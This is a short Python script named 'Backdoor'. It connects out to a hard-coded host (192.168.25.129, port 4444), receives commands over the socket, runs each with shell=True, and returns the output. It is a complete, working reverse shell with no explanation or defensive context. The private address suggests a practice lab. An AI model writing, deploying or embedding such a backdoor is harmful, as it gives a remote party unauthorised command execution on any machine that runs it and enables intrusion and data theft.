#!/usr/bin/env python 

import socket 
import subprocess 


class Backdoor : 
    def __init__(self,ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        pass

    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True)
    def run(self):
        while True:
            command = self.connection.recv(1024)
            result_command = self.execute_system_command(command)
            self.connection.send(result_command)
back = Backdoor("192.168.25.129",4444)
back.run()